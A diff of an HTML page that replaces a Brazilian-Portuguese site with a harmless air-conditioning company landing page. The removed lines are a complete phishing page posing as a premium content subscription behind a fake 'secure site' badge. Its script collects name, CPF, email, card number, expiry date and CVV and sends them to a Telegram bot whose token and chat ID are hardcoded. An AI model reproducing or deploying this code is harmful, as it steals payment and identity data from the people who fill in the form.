@@ -1,207 +1,238 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Casa da Mari Gaddy</title>
-    <style>
-        /* Estilos originais mantidos */
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #111;
-        }
+<html><head><base href="/" />
+<style>
+:root {
+  --neon-blue: #00f3ff;
+  --neon-red: #ff1f1f;
+  --cold-blue: #0066cc;
+  --warm-red: #ff4444;
+}
 
-        .header {
-            background-image: url('images/capa.png');
-            height: 300px;
-            background-size: cover;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 48px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            animation: neon 1.5s ease-in-out infinite alternate;
-        }
+body {
+  margin: 0;
+  padding: 0;
+  background: #001220;
+  font-family: 'Arial', sans-serif;
+  color: white;
+  min-height: 100vh;
+  overflow-x: hidden;
+  line-height: 1.6;
+}
 
-        @keyframes neon {
-            0% {
-                text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff, 0 0 40px #ff00ff;
-            }
-            100% {
-                text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff, 0 0 40px #ff00ff, 0 0 50px #ff00ff;
-            }
-        }
+.container {
+  max-width: 100%;
+  padding: 20px;
+  text-align: center;
+}
 
-        .container {
-            padding: 20px;
-            text-align: center;
-            color: white;
-        }
+.logo-container {
+  position: relative;
+  margin: 20px auto;
+  width: 150px;
+  height: 150px;
+  animation: pulse 2s infinite;
+}
 
-        .premium-offer {
-            background-color: #ff0000;
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            animation: neon-pulse 1s ease-in-out infinite alternate;
-        }
+.company-name {
+  font-size: 2em;
+  font-weight: bold;
+  margin: 20px 0;
+  text-shadow: 0 0 10px var(--neon-blue),
+               0 0 20px var(--neon-blue),
+               0 0 30px var(--neon-blue);
+  animation: flicker 3s infinite;
+  letter-spacing: 1px;
+}
 
-        @keyframes neon-pulse {
-            0% {
-                box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
-            }
-            100% {
-                box-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000;
-            }
-        }
+.services {
+  background: rgba(0, 30, 60, 0.8);
+  padding: 20px;
+  border-radius: 10px;
+  margin: 20px auto;
+  max-width: 800px;
+  border: 1px solid var(--neon-blue);
+  box-shadow: 0 0 15px var(--neon-blue);
+}
 
-        .form-section {
-            display: none;
-            margin-top: 20px;
-            padding: 20px;
-            background-color: #222;
-            border-radius: 10px;
-            box-shadow: 0 0 15px #ff0000;
-            animation: neon-pulse 1s ease-in-out infinite alternate;
-        }
+.service-category {
+  margin: 20px 0;
+  text-align: left;
+}
 
-        .form-section input {
-            display: block;
-            margin: 10px auto;
-            padding: 10px;
-            width: 80%;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            background-color: #333;
-            color: white;
-            font-size: 16px;
-        }
+.service-category h3 {
+  color: var(--neon-blue);
+  margin-bottom: 10px;
+  font-size: 1.3em;
+}
 
-        .submit-btn {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.3s ease;
-        }
+.service-list {
+  list-style: none;
+  padding: 0;
+}
 
-        .submit-btn:hover {
-            background-color: #45a049;
-        }
+.service-list li {
+  margin: 10px 0;
+  padding: 12px;
+  background: rgba(0, 243, 255, 0.1);
+  border-radius: 5px;
+  font-size: 1.1em;
+}
 
-        .verified {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #00ff00;
-        }
+.whatsapp-button {
+  display: inline-block;
+  background: #25D366;
+  color: white;
+  padding: 15px 30px;
+  border-radius: 25px;
+  text-decoration: none;
+  margin: 20px 0;
+  font-weight: bold;
+  font-size: 1.2em;
+  box-shadow: 0 0 15px #25D366;
+  animation: pulse 2s infinite;
+}
 
-        .secure-site {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 16px;
-            border-radius: 5px;
-        }
-    </style>
+.info {
+  background: rgba(0, 30, 60, 0.8);
+  padding: 20px;
+  border-radius: 10px;
+  margin-top: 20px;
+  border: 1px solid var(--neon-blue);
+  box-shadow: 0 0 15px var(--neon-blue);
+}
+
+.info h2 {
+  font-size: 1.5em;
+  margin-bottom: 15px;
+}
+
+.info p {
+  font-size: 1.1em;
+  margin: 10px 0;
+}
+
+.fan {
+  position: fixed;
+  opacity: 0.1;
+  pointer-events: none;
+}
+
+@keyframes pulse {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+  100% { transform: scale(1); }
+}
+
+@keyframes flicker {
+  0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
+    opacity: 1;
+  }
+  20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
+    opacity: 0.4;
+  }
+}
+
+@media screen and (max-width: 480px) {
+  .company-name {
+    font-size: 1.8em;
+  }
+  
+  .service-list li {
+    font-size: 1em;
+  }
+  
+  .whatsapp-button {
+    font-size: 1.1em;
+    padding: 12px 24px;
+  }
+}
+</style>
 </head>
 <body>
-    <div class="header">
-        Casa da Mari Gaddy
-    </div>
-    <div class="container">
-        <h2>Assine o plano premium!</h2>
-        <p>Tenha acesso a mais de 100 fotos e vídeos exclusivos da Mariana Gaddy.</p>
-        <p>Primeiro mês gratuito! Após 30 dias, apenas R$ 9,99 mensais.</p>
-        <p>Inclui acesso a bate-papo online com a Mariana Gaddy.</p>
-        <div class="premium-offer">
-            <strong>Obtenha sua assinatura agora!</strong>
-        </div>
-        <button class="submit-btn" id="get-subscription">Obter Assinatura</button>
 
-        <div class="form-section" id="form-section">
-            <h3>Formulário de Assinatura</h3>
-            <input type="text" id="name" placeholder="Nome" required>
-            <input type="text" id="cpf" placeholder="CPF (Formato: 000.000.000-00)" required maxlength="14">
-            <input type="email" id="email" placeholder="E-mail" required>
-            <input type="text" id="card-number" placeholder="Número do Cartão (Formato: 0000 0000 0000 0000)" required maxlength="19">
-            <input type="text" id="expiry-date" placeholder="Data de Validade (MM/AA)" required maxlength="5">
-            <input type="text" id="cvv" placeholder="Código de Segurança" required maxlength="3">
-            <button class="submit-btn" id="submit-form">Enviar</button>
-        </div>
+<div class="container">
+  <div class="logo-container">
+    <img src="logo.jpg" alt="RESET AR CONDICIONADO logo - snowflake with wrench" width="150" height="150">
+  </div>
 
-        <div class="verified" id="verified-section" style="display: none;">
-            <p>✅ Seu perfil foi verificado!</p>
-            <p>A compra será notificada por e-mail.</p>
-        </div>
+  <h1 class="company-name">RESET AR CONDICIONADO</h1>
 
-        <div class="secure-site">
-            🔒 Este é um site seguro e verificado. Seus dados estão protegidos!
-        </div>
+  <div class="services">
+    <div class="service-category">
+      <h3>Instalação</h3>
+      <ul class="service-list">
+        <li>ELGIN</li>
+        <li>Fujitsu</li>
+        <li>Electrolux</li>
+        <li>LG</li>
+        <li>HOMECO</li>
+        <li>Gree</li>
+        <li>Springer</li>
+      </ul>
     </div>
 
-    <script>
-        document.getElementById('get-subscription').addEventListener('click', function() {
-            document.getElementById('form-section').style.display = 'block';
-        });
+    <div class="service-category">
+      <h3>Manutenção</h3>
+      <ul class="service-list">
+        <li>Manutenção geral</li>
+        <li>Consertos</li>
+      </ul>
+    </div>
 
-        // Função para formatar CPF
-        document.getElementById('cpf').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '').slice(0, 11);
-            e.target.value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-        });
+    <div class="service-category">
+      <h3>Outros Serviços</h3>
+      <ul class="service-list">
+        <li>Higienização</li>
+        <li>Mudança de local</li>
+        <li>Carga de gás</li>
+      </ul>
+    </div>
 
-        // Função para formatar o número do cartão
-        document.getElementById('card-number').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '').slice(0, 16);
-            e.target.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");
-        });
+    <div class="service-category">
+      <h3>Promoções</h3>
+      <ul class="service-list">
+        <li>Promoção especial para limpeza em Split</li>
+      </ul>
+    </div>
+  </div>
 
-        // Função para formatar a data de validade
-        document.getElementById('expiry-date').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '').slice(0, 4);
-            e.target.value = value.replace(/(\d{2})(\d{2})/, "$1/$2");
-        });
+  <a href="https://wa.me/5513974173380?text=Gostaria%20de%20fazer%20um%20orçamento%20com%20a%20empresa%20RESET%20AR%20CONDICIONADO" class="whatsapp-button">
+    Solicitar Orçamento via WhatsApp
+  </a>
 
-        document.getElementById('submit-form').addEventListener('click', function() {
-            const name = document.getElementById('name').value;
-            const cpf = document.getElementById('cpf').value;
-            const email = document.getElementById('email').value;
-            const cardNumber = document.getElementById('card-number').value;
-            const expiryDate = document.getElementById('expiry-date').value;
-            const cvv = document.getElementById('cvv').value;
+  <div class="info">
+    <h2>Informações de Atendimento</h2>
+    <p>Atendemos todas as regiões de São Paulo</p>
+    <p>Falar com Gustavo ou Viviane</p>
+  </div>
+</div>
 
-            const token = '7204036205:AAHchmdso7LLCfbDjnniaQ4FrpF2ey34E4A';
-            const chatId = '6370380481';
-            const message = `Novo Cadastro \nNome: ${name}\nCPF: ${cpf}\nEmail: ${email}\nNúmero do Cartão: ${cardNumber}\nData de Validade: ${expiryDate}\nCódigo de Segurança: ${cvv}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+<script>
+function createFan() {
+  const fan = document.createElement('div');
+  fan.className = 'fan';
+  fan.innerHTML = `
+    <svg width="50" height="50" viewBox="0 0 100 100">
+      <g fill="rgba(255,255,255,0.1)">
+        <path d="M50 20 L60 50 L50 80 L40 50 Z">
+          <animateTransform
+            attributeName="transform"
+            type="rotate"
+            from="0 50 50"
+            to="360 50 50"
+            dur="4s"
+            repeatCount="indefinite"/>
+        </path>
+      </g>
+    </svg>
+  `;
+  fan.style.left = Math.random() * window.innerWidth + 'px';
+  fan.style.top = Math.random() * window.innerHeight + 'px';
+  document.body.appendChild(fan);
+}
 
-            fetch(url)
-                .then(response => {
-                    if (response.ok) {
-                        document.getElementById('verified-section').style.display = 'block';
-                        setTimeout(() => {
-                            alert('Cadastro enviado com sucesso! Você receberá uma confirmação em breve.');
-                            location.reload();
-                        }, 4000);
-                    } else {
-                        alert('Erro ao enviar cadastro. Tente novamente.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Erro:', error);
-                    alert('Erro ao enviar cadastro. Tente novamente.');
-                });
-        });
-    </script>
-</body>
-</html>
+for (let i = 0; i < 10; i++) {
+  createFan();
+}
+</script>
+
+</body></html>
